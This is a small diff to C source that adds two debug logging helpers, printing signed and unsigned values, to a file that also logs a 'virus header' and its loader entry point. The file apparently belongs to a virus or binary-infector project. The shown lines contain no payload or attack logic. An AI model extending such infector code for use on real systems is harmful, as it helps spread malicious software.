@@ -72,4 +72,20 @@ void	log_virus_header(struct virus_header *vhdr)
 	putstr(loader_entry); putu64((size_t)vhdr->loader_entry); putstr(newline);
 }
 
+void	log_dvalue(int32_t value)
+{
+	PD_ARRAY(char, newline, '\n',0);
+	PD_ARRAY(char, d, '[','L','O','G',']',' ','v','a','l','u','e',':',' ',0);
+
+	putstr(d); dput32(value); putstr(newline);
+}
+
+void	log_uvalue(size_t value)
+{
+	PD_ARRAY(char, newline, '\n',0);
+	PD_ARRAY(char, d, '[','L','O','G',']',' ','v','a','l','u','e',':',' ',0);
+
+	putstr(d); putu64(value); putstr(newline);
+}
+
 #endif
